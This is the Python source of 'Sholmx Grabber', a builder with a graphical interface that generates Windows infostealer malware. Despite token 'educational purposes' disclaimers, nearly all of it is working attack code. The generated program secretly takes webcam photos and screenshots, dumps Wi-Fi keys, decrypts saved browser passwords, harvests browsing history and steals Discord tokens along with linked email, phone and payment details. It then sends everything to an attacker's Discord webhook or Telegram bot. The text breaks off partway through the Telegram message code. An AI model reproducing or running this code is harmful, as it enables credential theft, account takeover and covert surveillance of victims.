# DO NOT RUN THIS CODE DRY, RUN BUILDER.BAT
# this code was created for educational purposes only
# if you have any concerns add me on discord: sholmx
# dont use for malicious purposes
# THIS CODE IS TRADE MARKED, UNAUTHORISED USE WILL BE TAKEN TO COURT
# AKA dont skid

import subprocess
import sys
import os
import time
import base64
import json
import re
import requests
from datetime import datetime, timezone
import threading
import customtkinter as ctk
from tkinter import messagebox
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import sqlite3
import shutil
import cv2
import pyautogui
import zipfile
import ctypes
import winreg

class grabber222(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Sholmx Grabber v1.0 | RELEASE")
        self.geometry("1000x700")
        self.resizable(False, False)
        self.configure(fg_color="#1a1a1a")
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("dark-blue")
        self.main_frame = ctk.CTkFrame(self, corner_radius=15, fg_color="#252526")
        self.main_frame.pack(pady=20, padx=20, fill="both", expand=True)
        self.header_frame = ctk.CTkFrame(self.main_frame, corner_radius=10, fg_color="#2d2d2d")
        self.header_frame.pack(pady=15, padx=15, fill="x")
        self.header_label = ctk.CTkLabel(
            self.header_frame,
            text="Sholmx Grabber",
            font=("Roboto", 24, "bold"),
            text_color="#00b4d8"
        )
        self.header_label.pack(pady=10)
        self.tabview = ctk.CTkTabview(
            self.main_frame,
            corner_radius=10,
            fg_color="#2d2d2d",
            segmented_button_fg_color="#404040",
            segmented_button_selected_color="#00b4d8",
            segmented_button_selected_hover_color="#0096b1"
        )
        self.tabview.pack(padx=15, pady=(0, 15), fill="both", expand=True)
        self.tabview.add("Builder")
        self.tabview.add("Token Tester")
        self.setup_build_tab()
        self.setup_test_tab()
        self.status_frame = ctk.CTkFrame(self.main_frame, corner_radius=10, fg_color="#2d2d2d")
        self.status_frame.pack(pady=(0, 15), padx=15, fill="x")
        self.status_label = ctk.CTkLabel(
            self.status_frame,
            text="Ready",
            font=("Roboto", 12),
            text_color="#808080"
        )
        self.status_label.pack(pady=5)

    def setup_build_tab(self):
        build_frame = ctk.CTkFrame(self.tabview.tab("Builder"), fg_color="transparent")
        build_frame.pack(padx=20, pady=20, fill="both", expand=True)

        method_frame = ctk.CTkFrame(build_frame, corner_radius=8, fg_color="#333333")
        method_frame.pack(pady=10, padx=10, fill="x")
        self.method_label = ctk.CTkLabel(
            method_frame,
            text="Notification Method",
            font=("Roboto", 14, "bold"),
            text_color="#ffffff"
        )
        self.method_label.pack(pady=(10, 5), padx=10, anchor="w")
        self.method_toggle = ctk.CTkOptionMenu(
            method_frame,
            values=["Discord", "Telegram"],
            command=self.toggle_method,
            fg_color="#404040",
            button_color="#00b4d8",
            button_hover_color="#0096b1",
            corner_radius=5
        )
        self.method_toggle.set("Discord")
        self.method_toggle.pack(pady=(0, 10), padx=10, fill="x")

        self.settings_frame = ctk.CTkFrame(build_frame, corner_radius=8, fg_color="#333333")
        self.settings_frame.pack(pady=10, padx=10, fill="x")

        self.webhook_label = ctk.CTkLabel(
            self.settings_frame,
            text="Discord Webhook",
            font=("Roboto", 14, "bold"),
            text_color="#ffffff"
        )
        self.webhook_entry = ctk.CTkEntry(
            self.settings_frame,
            width=500,
            placeholder_text="Enter Discord webhook here",
            corner_radius=5,
            fg_color="#404040",
            border_color="#00b4d8"
        )

        self.telegram_token_label = ctk.CTkLabel(
            self.settings_frame,
            text="Telegram Bot Token",
            font=("Roboto", 14, "bold"),
            text_color="#ffffff"
        )
        self.telegram_token_entry = ctk.CTkEntry(
            self.settings_frame,
            width=500,
            placeholder_text="Enter Telegram bot token here",
            corner_radius=5,
            fg_color="#404040",
            border_color="#00b4d8"
        )
        self.telegram_chat_id_label = ctk.CTkLabel(
            self.settings_frame,
            text="Telegram Chat ID",
            font=("Roboto", 14, "bold"),
            text_color="#ffffff"
        )
        self.telegram_chat_id_entry = ctk.CTkEntry(
            self.settings_frame,
            width=500,
            placeholder_text="Enter Telegram chat ID here",
            corner_radius=5,
            fg_color="#404040",
            border_color="#00b4d8"
        )

        self.toggle_method("Discord")

        options_frame = ctk.CTkFrame(build_frame, corner_radius=8, fg_color="#333333")
        options_frame.pack(pady=10, padx=10, fill="x")
        self.ping_label = ctk.CTkLabel(
            options_frame,
            text="Ping type (Discord only)",
            font=("Roboto", 14, "bold"),
            text_color="#ffffff"
        )
        self.ping_label.grid(row=0, column=0, pady=(10, 5), padx=10, sticky="w")
        self.ping_type = ctk.CTkOptionMenu(
            options_frame,
            values=["@everyone", "@here", "none"],
            fg_color="#404040",
            button_color="#00b4d8",
            button_hover_color="#0096b1",
            corner_radius=5
        )
        self.ping_type.set("@everyone")
        self.ping_type.grid(row=1, column=0, pady=(0, 10), padx=10, sticky="ew")
        self.filename_label = ctk.CTkLabel(
            options_frame,
            text="File name",
            font=("Roboto", 14, "bold"),
            text_color="#ffffff"
        )
        self.filename_label.grid(row=0, column=1, pady=(10, 5), padx=10, sticky="w")
        self.filename_entry = ctk.CTkEntry(
            options_frame,
            width=300,
            placeholder_text="bootstrapper, executor, etc",
            corner_radius=5,
            fg_color="#404040",
            border_color="#00b4d8"
        )
        self.filename_entry.grid(row=1, column=1, pady=(0, 10), padx=10, sticky="ew")
        options_frame.columnconfigure(0, weight=1)
        options_frame.columnconfigure(1, weight=1)

        self.build_button = ctk.CTkButton(
            build_frame,
            text="Build Grabber",
            command=self.build_grabber,
            font=("Roboto", 16, "bold"),
            fg_color="#00b4d8",
            hover_color="#0096b1",
            corner_radius=8,
            height=40
        )
        self.build_button.pack(pady=20)

    def toggle_method(self, method):
        for widget in self.settings_frame.winfo_children():
            widget.pack_forget()

        if method == "Discord":
            self.webhook_label.pack(pady=(10, 5), padx=10, anchor="w")
            self.webhook_entry.pack(pady=(0, 10), padx=10, fill="x")
        elif method == "Telegram":
            self.telegram_token_label.pack(pady=(10, 5), padx=10, anchor="w")
            self.telegram_token_entry.pack(pady=(0, 5), padx=10, fill="x")
            self.telegram_chat_id_label.pack(pady=(5, 5), padx=10, anchor="w")
            self.telegram_chat_id_entry.pack(pady=(0, 10), padx=10, fill="x")

    def setup_test_tab(self):
        test_frame = ctk.CTkFrame(self.tabview.tab("Token Tester"), fg_color="transparent")
        test_frame.pack(padx=20, pady=20, fill="both", expand=True)
        token_frame = ctk.CTkFrame(test_frame, corner_radius=8, fg_color="#333333")
        token_frame.pack(pady=10, padx=10, fill="x")
        self.token_label = ctk.CTkLabel(
            token_frame,
            text="Discord Token",
            font=("Roboto", 14, "bold"),
            text_color="#ffffff"
        )
        self.token_label.pack(pady=(10, 5), padx=10, anchor="w")
        self.token_entry = ctk.CTkEntry(
            token_frame,
            width=500,
            placeholder_text="Enter Discord token to test",
            corner_radius=5,
            fg_color="#404040",
            border_color="#00b4d8"
        )
        self.token_entry.pack(pady=(0, 10), padx=10, fill="x")
        self.test_button = ctk.CTkButton(
            test_frame,
            text="Test Token",
            command=self.test_token,
            font=("Roboto", 16, "bold"),
            fg_color="#00b4d8",
            hover_color="#0096b1",
            corner_radius=8,
            height=40
        )
        self.test_button.pack(pady=20)
        self.result_frame = ctk.CTkFrame(test_frame, corner_radius=8, fg_color="#333333")
        self.result_frame.pack(pady=10, padx=10, fill="x")
        self.result_label = ctk.CTkLabel(
            self.result_frame,
            text="Test results will appear here",
            font=("Roboto", 12),
            text_color="#808080",
            wraplength=700
        )
        self.result_label.pack(pady=15, padx=10)

    def build_grabber(self):
        method = self.method_toggle.get()
        webhook_url = self.webhook_entry.get().strip() if method == "Discord" else ""
        telegram_token = self.telegram_token_entry.get().strip() if method == "Telegram" else ""
        telegram_chat_id = self.telegram_chat_id_entry.get().strip() if method == "Telegram" else ""
        ping_type = self.ping_type.get()
        filename = self.filename_entry.get().strip()
        self.status_label.configure(text="Building...")

        if method == "Discord" and not webhook_url:
            messagebox.showerror("Error", "Please enter a Discord webhook URL!")
            self.status_label.configure(text="Build failed: No webhook URL")
            return
        elif method == "Telegram" and (not telegram_token or not telegram_chat_id):
            messagebox.showerror("Error", "Please enter both Telegram bot token and chat ID!")
            self.status_label.configure(text="Build failed: Missing Telegram details")
            return

        if not filename:
            filename = "discord_grabber"
        ping_content = {"@everyone": "@everyone", "@here": "@here", "none": ""}.get(ping_type) if method == "Discord" else ""

        grabber_code = f'''import subprocess
import sys
import os
import time
import base64
import json
import re
import requests
from datetime import datetime, timezone
import threading
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import sqlite3
import shutil
import cv2
import pyautogui
import zipfile
import ctypes
import winreg
import platform
import psutil

os.chdir(os.path.dirname(os.path.abspath(__file__)))

LOCK_FILE = os.path.join(os.getenv("TEMP", "C:\\\\Temp"), "{filename}_lock")
SCREENSHOT_ZIP = os.path.join(os.getenv("TEMP", "C:\\\\Temp"), "data.zip")
WEBCAM_PATH = os.path.join(os.getenv("TEMP", "C:\\\\Temp"), "webcam.jpg")
SCREEN_PATH = os.path.join(os.getenv("TEMP", "C:\\\\Temp"), "screen.png")
GAME_INFO_PATH = os.path.join(os.getenv("TEMP", "C:\\\\Temp"), "game_info.txt")
WIFI_INFO_PATH = os.path.join(os.getenv("TEMP", "C:\\\\Temp"), "wifi_info.txt")
SEARCH_HISTORY_PATH = os.path.join(os.getenv("TEMP", "C:\\\\Temp"), "search_history.txt")
PASSWORD_FILE = os.path.join(os.getenv("TEMP", "C:\\\\Temp"), "pwd.txt")
SYSTEM_INFO_FILE = os.path.join(os.getenv("TEMP", "C:\\\\Temp"), "system_info.txt")

if os.path.exists(LOCK_FILE):
    try:
        with open(LOCK_FILE, 'r') as f:
            pid = int(f.read().strip())
        os.kill(pid, 0)
        sys.exit(0)
    except (OSError, ProcessLookupError):
        os.remove(LOCK_FILE)
    except Exception as e:
        os.remove(LOCK_FILE)

with open(LOCK_FILE, 'w') as f:
    f.write(str(os.getpid()))

try:
    required_modules = ['requests', 'Crypto', 'win32crypt', 'sqlite3', 'cv2', 'pyautogui', 'psutil']
    missing_modules = [m for m in required_modules if m not in sys.modules]
    if missing_modules:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "pycryptodome", "pywin32", "opencv-python", "pyautogui", "psutil"])

    BROWSER_PATHS = {{
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data"),
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data"),
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Login Data"),
        "Opera GX": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Login Data")
    }}
    SEARCH_HISTORY_PATHS = {{
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "History"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "History")
    }}
    TEMP_DB = os.path.join(os.getenv("TEMP", "C:\\\\Temp"), "ldc.db")
    TEMP_HISTORY_DB = os.path.join(os.getenv("TEMP", "C:\\\\Temp"), "history.db")
    WEBHOOK_URL = "{webhook_url}"
    TELEGRAM_TOKEN = "{telegram_token}"
    TELEGRAM_CHAT_ID = "{telegram_chat_id}"
    NOTIFICATION_METHOD = "{method}"
    WEBHOOK_NAME = "sholmx grabber"
    WEBHOOK_AVATAR = "https://th.bing.com/th/id/OIP.FecqYGeMV_hNSbDNPS_GRgHaHC?rs=1&pid=ImgDetMain"

    def capture_screenshots():
        try:
            cap = cv2.VideoCapture(0)
            if cap.isOpened():
                ret, frame = cap.read()
                if ret:
                    cv2.imwrite(WEBCAM_PATH, frame)
                cap.release()
        except Exception:
            pass
        try:
            screenshot = pyautogui.screenshot()
            screenshot.save(SCREEN_PATH)
        except Exception:
            pass

    def get_game_info():
        game_info = ""
        try:
            steam_path = os.path.join(os.getenv("PROGRAMFILES(X86)"), "Steam", "steamapps", "common")
            if os.path.exists(steam_path):
                games = os.listdir(steam_path)
                game_info += "Steam Games:\\n" + "\\n".join(games) + "\\n" + "-"*50 + "\\n"
            epic_path = os.path.join(os.getenv("PROGRAMDATA"), "Epic", "EpicGamesLauncher", "Data", "Manifests")
            if os.path.exists(epic_path):
                epic_games = []
                for file in os.listdir(epic_path):
                    if file.endswith(".item"):
                        with open(os.path.join(epic_path, file), "r", encoding="utf-8") as f:
                            data = json.load(f)
                            epic_games.append(data.get("DisplayName", "Unknown Game"))
                game_info += "Epic Games:\\n" + "\\n".join(epic_games) + "\\n" + "-"*50 + "\\n"
            with open(GAME_INFO_PATH, "w", encoding="utf-8") as f:
                f.write(game_info if game_info else "No game info found.\\n")
        except Exception as e:
            with open(GAME_INFO_PATH, "w", encoding="utf-8") as f:
                f.write(f"Error extracting game info: {{str(e)}}\\n")

    def get_wifi_info():
        try:
            result = subprocess.check_output(["netsh", "wlan", "show", "profiles"], text=True)
            profiles = [line.split(":")[1].strip() for line in result.splitlines() if "All User Profile" in line]
            wifi_info = ""
            for profile in profiles:
                try:
                    details = subprocess.check_output(["netsh", "wlan", "show", "profile", profile, "key=clear"], text=True)
                    wifi_info += f"Profile: {{profile}}\\n{{details}}\\n{{'-'*50}}\\n"
                except subprocess.CalledProcessError:
                    wifi_info += f"Profile: {{profile}}\\n[Password not accessible]\\n{{'-'*50}}\\n"
            with open(WIFI_INFO_PATH, "w", encoding="utf-8") as f:
                f.write(wifi_info if wifi_info else "No Wi-Fi profiles found.\\n")
        except Exception as e:
            with open(WIFI_INFO_PATH, "w", encoding="utf-8") as f:
                f.write(f"Error extracting Wi-Fi info: {{str(e)}}\\n")

    def get_search_history():
        with open(SEARCH_HISTORY_PATH, "w", encoding="utf-8") as f:
            for browser, history_path in SEARCH_HISTORY_PATHS.items():
                if not os.path.exists(history_path):
                    f.write(f"{{browser}} browser History not found\\n{{'-'*50}}\\n")
                    continue
                try:
                    shutil.copy2(history_path, TEMP_HISTORY_DB)
                    conn = sqlite3.connect(TEMP_HISTORY_DB)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch') as last_visit FROM urls ORDER BY last_visit_time DESC")
                    f.write(f"{{browser}} Full Search History:\\n")
                    for row in cursor.fetchall():
                        url, title, last_visit = row
                        f.write(f"URL: {{url}}\\nTitle: {{title}}\\nLast Visit: {{last_visit}}\\n{{'-'*50}}\\n")
                    conn.close()
                    if os.path.exists(TEMP_HISTORY_DB):
                        os.remove(TEMP_HISTORY_DB)
                except Exception as e:
                    f.write(f"Error extracting full history from {{browser}}: {{str(e)}}\\n{{'-'*50}}\\n")

    def get_system_info():
        try:
            system_info = f"System Information:\\n{{'-'*50}}\\n"
            system_info += f"OS: {{platform.system()}} {{platform.release()}} ({{platform.version()}})\\n"
            system_info += f"Machine: {{platform.machine()}}\\n"
            system_info += f"Processor: {{platform.processor()}}\\n"
            system_info += f"Hostname: {{platform.node()}}\\n"
            system_info += f"CPU Cores: {{psutil.cpu_count(logical=False)}} (Physical), {{psutil.cpu_count(logical=True)}} (Logical)\\n"
            system_info += f"CPU Usage: {{psutil.cpu_percent(interval=1)}}%\\n"
            mem = psutil.virtual_memory()
            system_info += f"Total RAM: {{mem.total / (1024**3):.2f}} GB\\n"
            system_info += f"Used RAM: {{mem.used / (1024**3):.2f}} GB\\n"
            system_info += f"Free RAM: {{mem.available / (1024**3):.2f}} GB\\n"
            disk = psutil.disk_usage('/')
            system_info += f"Total Disk: {{disk.total / (1024**3):.2f}} GB\\n"
            system_info += f"Used Disk: {{disk.used / (1024**3):.2f}} GB\\n"
            system_info += f"Free Disk: {{disk.free / (1024**3):.2f}} GB\\n"
            with open(SYSTEM_INFO_FILE, "w", encoding="utf-8") as f:
                f.write(system_info)
        except Exception as e:
            with open(SYSTEM_INFO_FILE, "w", encoding="utf-8") as f:
                f.write(f"Error collecting system info: {{str(e)}}\\n")

    def pack_and_send():
        try:
            with zipfile.ZipFile(SCREENSHOT_ZIP, 'w', compression=zipfile.ZIP_DEFLATED) as zipf:
                for file_path, arcname in [
                    (WEBCAM_PATH, "webcam.jpg"),
                    (SCREEN_PATH, "screen.png"),
                    (GAME_INFO_PATH, "game_info.txt"),
                    (WIFI_INFO_PATH, "wifi_info.txt"),
                    (SEARCH_HISTORY_PATH, "search_history.txt"),
                    (PASSWORD_FILE, "passwords.txt"),
                    (SYSTEM_INFO_FILE, "system_info.txt")
                ]:
                    if os.path.exists(file_path):
                        zipf.write(file_path, arcname)
            if NOTIFICATION_METHOD == "Discord":
                with open(SCREENSHOT_ZIP, "rb") as f:
                    response = requests.post(
                        WEBHOOK_URL,
                        data={{"username": WEBHOOK_NAME, "avatar_url": WEBHOOK_AVATAR}},
                        files={{"file": ("data.zip", f)}}
                    )
                    response.raise_for_status()
            elif NOTIFICATION_METHOD == "Telegram":
                with open(SCREENSHOT_ZIP, "rb") as f:
                    response = requests.post(
                        f"https://api.telegram.org/bot{{TELEGRAM_TOKEN}}/sendDocument",
                        data={{"chat_id": TELEGRAM_CHAT_ID, "caption": "Data collected by Sholmx Grabber"}},
                        files={{"document": ("data.zip", f)}}
                    )
                    response.raise_for_status()
        except Exception as e:
            pass

    def send_telegram_message(message):
        if NOTIFICATION_METHOD == "Telegram":
            try:
                response = requests.post(
                    f"https://api.telegram.org/bot{{TELEGRAM_TOKEN}}/sendMessage",
                    data={{"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}}
                )
                response.raise_for_status()
            except Exception:
                pass

    def get_encryption_key(local_state_path):
        if not os.path.exists(local_state_path):
            return None
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            decrypted_key = CryptUnprotectData(key, None, None, None, 0)[1]
            return decrypted_key
        except Exception:
            return None

    def decrypt_data(data, key, browser_name="Unknown"):
        if not key:
            return ""
        try:
            if data[:3] in [b'v10', b'v11', b'v20']:
                iv = data[3:15]
                if len(data) < 15 + 16:
                    return ""
                ciphertext = data[15:-16]
                tag = data[-16:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt(ciphertext)
                cipher.verify(tag)
                decoded = decrypted.decode('utf-8')
                return decoded
            else:
                decrypted = CryptUnprotectData(data, None, None, None, 0)[1].decode('utf-8')
                return decrypted
        except ValueError:
            return ""
        except UnicodeDecodeError:
            return ""
        except Exception:
            return ""

    def get_key(local_state_path):
        if not os.path.exists(local_state_path):
            return None
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]
            return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception:
            return None

    def decrypt_password(encrypted_password, key):
        if key is None:
            return "[No key available]"
        try:
            if encrypted_password[:3] in [b'v10', b'v11']:
                iv = encrypted_password[3:15]
                encrypted_password = encrypted_password[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt(encrypted_password[:-16])
                return decrypted.decode('utf-8')
            else:
                return CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
        except Exception as e:
            return f"[Unable to decrypt: {{str(e)}}]"

    def extract_passwords():
        browser_local_states = {{
            "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Local State"),
            "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Local State"),
            "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Local State"),
            "Opera GX": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Local State")
        }}
        with open(PASSWORD_FILE, "w", encoding="utf-8") as f:
            for browser, login_data_path in BROWSER_PATHS.items():
                if not os.path.exists(login_data_path):
                    f.write(f"{{browser}} browser Login Data not found\\n{{'-'*50}}\\n")
                    continue
                key = get_key(browser_local_states[browser])
                if not key:
                    f.write(f"{{browser}} - No encryption key found\\n{{'-'*50}}\\n")
                    continue
                try:
                    shutil.copy2(login_data_path, TEMP_DB)
                    conn = sqlite3.connect(TEMP_DB)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    found_passwords = False
                    f.write(f"{{browser}} Passwords:\\n")
                    for row in cursor.fetchall():
                        url, username, encrypted_password = row
                        if username and encrypted_password:
                            password = decrypt_password(encrypted_password, key)
                            f.write(f"Website: {{url}}\\nUsername: {{username}}\\nPassword: {{password}}\\n{{'-'*50}}\\n")
                            found_passwords = True
                        else:
                            f.write(f"Website: {{url}}\\nUsername: {{username}}\\nPassword: [No data]\\n{{'-'*50}}\\n")
                    if not found_passwords:
                        f.write(f"No passwords found in {{browser}}\\n{{'-'*50}}\\n")
                    conn.close()
                    if os.path.exists(TEMP_DB):
                        os.remove(TEMP_DB)
                except Exception as e:
                    f.write(f"Error extracting passwords from {{browser}}: {{str(e)}}\\n{{'-'*50}}\\n")

    class GrabDiscord:
        @staticmethod
        def initialize(raw_data):
            capture_screenshots()
            get_game_info()
            get_wifi_info()
            get_search_history()
            extract_passwords()
            get_system_info()
            FetchTokens().upload(raw_data)
            pack_and_send()
            return "Completed"

    class ExtractTokens:
        def __init__(self):
            self.base_url = "https://discord.com/api/v9/users/@me"
            self.appdata = os.getenv("localappdata")
            self.roaming = os.getenv("appdata")
            self.regexp = r"[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{25,110}}"
            self.regexp_enc = r"dQw4w9WgXcQ:[^\\"]*"
            self.tokens, self.uids = [], []
            self.extract()
        
        def extract(self):
            paths = {{'Discord': self.roaming + '\\\\discord\\\\Local Storage\\\\leveldb\\\\', 
                     'Discord Canary': self.roaming + '\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\', 
                     'Lightcord': self.roaming + '\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\', 
                     'Discord PTB': self.roaming + '\\\\discordptb\\\\Local Storage\\\\leveldb\\\\', 
                     'Opera': self.roaming + '\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\', 
                     'Opera GX': self.roaming + '\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\', 
                     'Chrome': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\', 
                     'Edge': self.appdata + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\', 
                     'Brave': self.appdata + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\'}}
            for name, path in paths.items():
                if not os.path.exists(path):
                    continue
                _discord = name.replace(" ", "").lower()
                if "cord" in path:
                    if not os.path.exists(self.roaming + f'\\\\{{_discord}}\\\\Local State'):
                        continue
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        try:
                            for line in [x.strip() for x in open(f'{{path}}\\\\{{file_name}}', errors='ignore').readlines() if x.strip()]:
                                for y in re.findall(self.regexp_enc, line):
                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\\\{{_discord}}\\\\Local State'))
                                    if self.validate_token(token):
                                        uid = requests.get(self.base_url, headers={{'Authorization': token}}).json()['id']
                                        if uid not in self.uids:
                                            self.tokens.append(token)
                                            self.uids.append(uid)
                        except Exception:
                            pass
                else:
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        try:
                            for line in [x.strip() for x in open(f'{{path}}\\\\{{file_name}}', errors='ignore').readlines() if x.strip()]:
                                for token in re.findall(self.regexp, line):
                                    if self.validate_token(token):
                                        uid = requests.get(self.base_url, headers={{'Authorization': token}}).json()['id']
                                        if uid not in self.uids:
                                            self.tokens.append(token)
                                            self.uids.append(uid)
                        except Exception:
                            pass

        def validate_token(self, token):
            try:
                r = requests.get(self.base_url, headers={{'Authorization': token}})
                return r.status_code == 200
            except Exception:
                return False
        
        def decrypt_val(self, buff, master_key):
            if not master_key:
                return ""
            try:
                iv = buff[3:15]
                payload = buff[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted_pass = cipher.decrypt(payload)
                return decrypted_pass[:-16].decode()
            except Exception:
                return ""
        
        def get_master_key(self, path):
            if not os.path.exists(path):
                return None
            try:
                with open(path, "r", encoding="utf-8") as f:
                    local_state = json.loads(f.read())
                if 'os_crypt' not in local_state:
                    return None
                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                return CryptUnprotectData(master_key, None, None, None, 0)[1]
            except Exception:
                return None

    class ExtractIPInfo:
        def __init__(self):
            self.ip_info = self.get_ip_info()

        def get_ip_info(self):
            try:
                response = requests.get("http://ip-api.com/json/?fields=status,message,continent,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query")
                if response.status_code == 200 and response.json().get("status") == "success":
                    data = response.json()
                    return {{
                        "ip": data.get("query", "Unknown"),
                        "continent": data.get("continent", "Unknown"),
                        "country": data.get("country", "Unknown"),
                        "countryCode": data.get("countryCode", "Unknown"),
                        "region": data.get("regionName", "Unknown"),
                        "city": data.get("city", "Unknown"),
                        "zip": data.get("zip", "Unknown"),
                        "lat": data.get("lat", "Unknown"),
                        "lon": data.get("lon", "Unknown"),
                        "timezone": data.get("timezone", "Unknown"),
                        "isp": data.get("isp", "Unknown"),
                        "org": data.get("org", "Unknown"),
                        "as": data.get("as", "Unknown")
                    }}
                return {{"error": "Failed to fetch IP info"}}
            except Exception:
                return {{"error": "Error fetching IP info"}}

    class FetchTokens:
        def __init__(self):
            self.tokens = ExtractTokens().tokens
            self.ip_info = ExtractIPInfo().ip_info
            self.WEBHOOK_NAME = WEBHOOK_NAME
            self.WEBHOOK_AVATAR = WEBHOOK_AVATAR

        def truncate(self, text, max_length=1000):
            if len(text) > max_length:
                return text[:max_length-3] + "..."
            return text

        def upload(self, raw_data):
            if not self.tokens:
                if NOTIFICATION_METHOD == "Discord":
                    requests.post(WEBHOOK_URL, json={{"username": self.WEBHOOK_NAME, "avatar_url": self.WEBHOOK_AVATAR, "content": "No Discord tokens found"}})
                elif NOTIFICATION_METHOD == "Telegram":
                    send_telegram_message("No Discord tokens found")
                return ["No Discord tokens found"]
            final_to_return = []
            headers = {{'Authorization': None}}
            for token in self.tokens:
                headers['Authorization'] = token
                try:
                    user_response = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
                    if user_response.status_code != 200:
                        continue
                    user = user_response.json()
                    billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()
                    guilds = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers).json()
                    connections = requests.get('https://discord.com/api/v8/users/@me/connections', headers=headers).json()
                    username = f"{{user['username']}}#{{user['discriminator']}}"
                    user_id = user['id']
                    email = user['email']
                    phone = user['phone']
                    mfa = user['mfa_enabled']
                    avatar = f"https://cdn.discordapp.com/avatars/{{user_id}}/{{user['avatar']}}.png"
                    nitro_types = {{0: 'None', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic'}}
                    nitro = nitro_types.get(user['premium_type'], 'None')
                    payment_methods = 'None' if not billing else '\\n'.join([f"CC (**** {{m['last_4']}})" if m['type'] == 1 else 'PayPal' for m in billing])
                    ip_info_str = "Failed to fetch IP info" if "error" in self.ip_info else f"IP: {{self.ip_info['ip']}}\\nCountry: {{self.ip_info['country']}} ({{self.ip_info['countryCode']}})\\nCity: {{self.ip_info['city']}}\\nISP: {{self.ip_info['isp']}}"
                    if NOTIFICATION_METHOD == "Discord":
                        webhook_data = {{ 
                            "username": self.WEBHOOK_NAME, 
                            "avatar_url": self.WEBHOOK_AVATAR, 
                            "content": "{ping_content}", 
                            "embeds": [{{
                                "title": f"Token Grabbed: {{username}} ({{user_id}})", 
                                "color": 0xFF0000, 
                                "thumbnail": {{"url": avatar}}, 
                                "fields": [
                                    {{"name": "🔑 Discord Token", "value": f"```{{self.truncate(token)}}```", "inline": False}},
                                    {{"name": "👤 User Info", "value": self.truncate(f"Email: {{email or 'None'}}\\nPhone: {{phone or 'None'}}\\nMFA: {{mfa}}"), "inline": True}},
                                    {{"name": "💎 Nitro", "value": self.truncate(nitro), "inline": True}},
                                    {{"name": "💳 Payment", "value": self.truncate(payment_methods), "inline": True}},
                                    {{"name": "🏰 Guilds", "value": self.truncate(f"Count: {{len(guilds)}}\\n" + '\\n'.join([f"{{g['name']}} ({{g['id']}})" for g in guilds[:5]])), "inline": False}},
                                    {{"name": "🔗 Connections", "value": self.truncate('\\n'.join([f"{{c['type']}}: {{c['name']}}" for c in connections]) if connections else 'None'), "inline": False}},
                                    {{"name": "🌐 IP Info", "value": self.truncate(ip_info_str), "inline": False}}
                                ],
                                "footer": {{"text": "sholmx grabber - github.com/sholmx"}}, 
                                "timestamp": datetime.now(timezone.utc).isoformat()
                            }}]
                        }}
                        requests.post(WEBHOOK_URL, json=webhook_data)
                    elif NOTIFICATION_METHOD == "Telegram":
                        message_content = (
                            f"*Token Grabbed: {{username}} ({{user_id}})*\\n"
                            f"🔑 *Discord Token*: ```{{self.truncate(token)}}```\\n"
                            f"👤 *User Info*: Email: {{email or 'None'}} | Phone: {{phone or 'None'}} | MFA: {{mfa}}\\n"
                            f"💎 *Nitro*: {{nitro}}\\n"
                            f"💳 *Payment*: {{payment_methods}}\\n"
                            f"🏰 *Guilds*: Count: {{len(guilds)}}\\n{{self.truncate('\\n'.join([f'{{g['name']}} ({{g['id']}})' for g in guilds[:5]]))}}\\n"
